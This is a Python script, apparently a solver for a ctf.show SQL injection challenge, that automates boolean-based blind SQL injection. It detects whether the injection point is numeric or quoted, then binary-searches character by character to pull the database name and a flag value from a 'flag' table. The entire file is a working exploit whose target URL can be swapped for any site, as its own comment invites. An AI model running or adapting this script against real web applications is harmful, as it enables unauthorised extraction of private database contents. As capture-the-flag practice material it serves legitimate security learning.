#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys
import time
import requests
requests.packages.urllib3.disable_warnings()

BASE = sys.argv[1] if len(sys.argv) > 1 else "https://1a1de5e4-b4ec-4420-9f28-89617684f5a6.challenge.ctf.show/"#把“目标地址”替换为要测试的网站
URL = BASE.rstrip("/") + "/check" 
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/124.0 Safari/537.36")
HEADERS = {"User-Agent": UA}

NUMERIC_T = "1 and ({})"            # 数字型
CHAR_SQ_T = "1' and ({}) and '1"    # 字符型(单引号)
CHAR_DQ_T = '1" and ({}) and "1'    # 字符型(双引号)
TEMPLATE = None

def _get(payload, tries=6):
    """发一条请求，返回 exists 布尔；连接被重置/超时就重试。"""
    last = None
    for _ in range(tries):
        try:
            r = requests.get(URL, params={"id": payload}, headers=HEADERS,
                             verify=False, timeout=20)
            return r.json().get("exists") is True
        except Exception as e:
            last = e
            time.sleep(0.6)
    raise RuntimeError("请求反复失败: %r (%r)" % (payload, last))

def detect_type():
    global TEMPLATE
    if _get("1 and 1=2") is False:
        TEMPLATE = NUMERIC_T
        return "numeric（数字型）"
    if _get("1' and (1=2) and '1") is False:
        TEMPLATE = CHAR_SQ_T
        return "character（字符型·单引号）"
    if _get('1" and (1=2) and "1') is False:
        TEMPLATE = CHAR_DQ_T
        return "character（字符型·双引号）"
    TEMPLATE = CHAR_SQ_T
    return "character（默认按单引号）"

def ask(cond):
    return _get(TEMPLATE.format(cond)) is True

def get_len(scalar):
    """二分求标量表达式的长度。scalar 如 database() 或 (select flag from flag limit 1)"""
    lo, hi = 0, 300
    while lo < hi:
        mid = (lo + hi) // 2
        if ask("(select length(%s))>%d" % (scalar, mid)):
            lo = mid + 1
        else:
            hi = mid
    return lo

def get_str(scalar):
    n = get_len(scalar)
    out = ""
    for i in range(1, n + 1):
        lo, hi = 0, 127
        while lo < hi:
            mid = (lo + hi) // 2
            if ask("(select ascii(substr(%s,%d,1)))>%d" % (scalar, i, mid)):
                lo = mid + 1
            else:
                hi = mid
        out += chr(lo)
        print("    第 %2d 位 -> %r  (%s)" % (i, chr(lo), out), flush=True)
    return out

print("[*] 探测注入类型 ...")
print("[*] 类型 =", detect_type(), " | 模板 =", TEMPLATE)
print("[*] 库名   :", get_str("database()"))
print("[*] flag值 :", get_str("(select flag from sql_injection_lab.flag limit 1)"))
